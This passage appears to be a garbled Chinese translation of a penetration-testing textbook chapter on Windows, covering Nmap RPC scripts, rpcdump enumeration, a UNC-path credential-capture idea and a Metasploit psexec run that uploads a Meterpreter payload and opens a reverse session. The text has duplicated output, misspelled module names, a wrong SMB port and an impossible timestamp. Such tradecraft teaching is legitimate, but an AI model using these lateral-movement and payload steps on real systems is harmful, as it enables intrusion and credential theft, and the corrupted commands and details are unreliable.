
`bitcoinrpc-info.nse`

`deluge-rpc-brute.nse`

`metasploit-msrpc-brute.nse`

`metasploit-xmlrpc-brute.nse`

`nmspc-enum.nse`

`ness-xmlrpc-brute.nse`

`rpccap-brute.nse`

`rpccap-info.nse`

`rpcconf.nse`

`xmlrpc-methods.nse`

> 提示 记住你可以使用 `nsdiscover.py` 脚本来查看有关脚本的信息。你也可以使用 `nmap --script=<ScriptName>` 来查找脚本的帮助。例如，`nmap -script=msrpc-enum` 会打印以下内容：

```
Starting Nmap 7.80 at 2020-01-29 17:39

https://nmap.org/scripts/msrpc-enum
```
Starting Nmap 7.80 at 2020-01-29 17:39
https://nmap.org/scripts/msrpc-enum

```
Starting Nmap 7.80 ...
```

为了简洁起见，我们删减了输出并仅显示了一些常见的接口。之前提到的 SAM 通过这些 RPC 服务可以访问，并且你会发现许多利用 RPC 作为病毒软件甚至恶意软件的进程间通信（IPC）机制。

为什么不查看 `rpcdump.exe`，它是 Nmap 脚本的基础工具之一？包含在 Windows Server 2003 工具包和我们的常用 Windows 工具编译中。你无法在 Kali Linux 虚拟机中运行这些工具，因为它们是 Windows 可执行文件（`.exe`）。可能两个可以使用模拟器（如 Wine）运行，并且有一些 Linux 替代方案。

当你在 Windows 终端中带任何参数运行该工具时，显示如下：

```
RPCDump:Rpc 端点诊断工具。

/S 要查询的主机名称。（如果未指定则认为本地）

/V 详细模式。

/I 扫描所有注册的端点。

/P 协议：（默认 ncacip_tcp）

np（连接性命名管道）

mq（通过微软消息队列服务器的数据报）

ipx（无连接 IPX 数据报）

spx（连接性 SPX）

http（使用 Microsoft IIS 作为 HTTP 代理的连接性 TCP/IP）

nb_nb（连接性 NetBEUI）

nb_tcp（基于 TCP 的连接性 NetBIOS）

nb_ipx（基于 IPX 的连接性 NetBIOS）

ip_tcp（连接性 TCP/IP）

at_dsp（AppleTalk DSP）

ip_udp（基于 UDP/IP 的数据报）
```
你可以看到某些通过 SMB 的 RPC。

```
# 第 13 章 - Microsoft Windows 493
```
e.g. `rpcdump /s foo /v /i`
`:\Program Files (x86)\Windows Resource Kits\Tools>`

该工具的使用可以让你了解可用的 RPC 变体。你可以使用你的 Windows 2019 评估版下载此工具，然后使用命令 `rpcdump /i` 针对托管该服务的本地主机运行该工具。这让你让你了解该工具的功能。我们缩短了部分内容，以强调你可以识别出运行在该主机上的 Microsoft IIS Web 服务器。这意味着本地主机可能具有 Web 服务器的通信和配置能力，并且可能在服务器的 Web 中包含凭据，或者通过将 UNC 路径作为超链接注入，因为 Windows 系统在打开 UNC 路径时可能会被破解，从而通过 SMB 提供凭据。

```
C:\Program Files\>rpcdump /s
192.168.56.104 /i
Querying Endpoint Mapper Database...
71 registered endpoints found.
```

正在收集数据....这可能需要一些时间。

| 0 | 10 | 20 | 30 | 40 | 50 | 60 | 70 | 80 | 90 | 100 |

|---|---|---|---|---|---|---|---|---|---|---|

```
ncac_http(Connection-oriented TCP/IP using Microsoft Internet
Information Server as HTTP proxy).
192.168.56.104[49158] [12345678-1234-abcd-ef00-01234567cffb] :ACCESS_DENIED
192.168.56.104[49158] [12345678-1234-abcd-ef00-0123456789ab] :ACCESS_DENIED
192.168.56.104[49158] [e5314235-4b06-11d1-ab04-00c4fc2cd22] MS Network Directory
DR Interface :ACCESS_DENIED
```

你可以在 Metasploit 中找到 RPC 的工具，以及辅助模块 `smb_enum_group`。

我们有一组工具包（`[www.hackerbook.com/files/Windows_Tradecraft_Tools.zip`）用于探索 LDAP、SMB 和 RPC，并使用这些服务进行横向移动。通过使用像 `PsExec`（一种在远程主机上启动服务并运行命令的轻量级工具）和 `Impacket`（位于 `github.com/SecureAuthCorp/impacket` 的一组用于处理不同网络协议的 Python 类），你可以在 Windows 系统上调度服务、与远程网络资源交互并在 Windows 系统上运行命令。`PsExec` 会在远程系统上创建一个服务，并且在 Metasploit 中也可用。配置 `windows/smb/psexec` 使用原生目标针对主机运行可能会显示与提供此段落代码相似的输出。我们将为该模块使用 Meterpreter 载荷，例如 `windows/meterpreter-reverse_hooks`，它会将 Meterpreter 注入到主机内存中。Meterpreter 是一个载荷管理系统，同时也提供 Shell，它肯定会触发杀毒软件（AV）服务，但这就是你运行的 `.exe` 的样子。我们将在本章稍后部分详细讨论 Meterpreter。现在，只需知道它创建了你可以交互的会话即可。

```
msf5 exploit (windows/sm/pexec) > run
[*] Started HTTPS reverse handler on https://192.168.11.199:443
[*] 192.168.11.61:45 - Connecting to the server...
[*] 192.168.11.61:45 - Authenticating to 192.168.11.61:45|HACKERHOUSE as 'hdadmin'
[*] 192.168.11.61:45 - Uploading payload... pFVqdah.exe
[*] 192.168.11.61:45 - Created pFVqdah.exe...
[*] https://192.168.11.199:443 handling request from 192.168.11.61;(UID: tg8bs) Staging x86 payload (18337 bytes)
[*] Meterpreter session opened (192.168.11.199:443) -> 192.168.11.61:(51984) at 2022-02-07 51:47 -0500
[*] 192.168.11.61:45 - Service started!
```

一旦我们利用了任何 Windows 系统，我们将运行命令来从那些主机枚举信息，作为后利用。
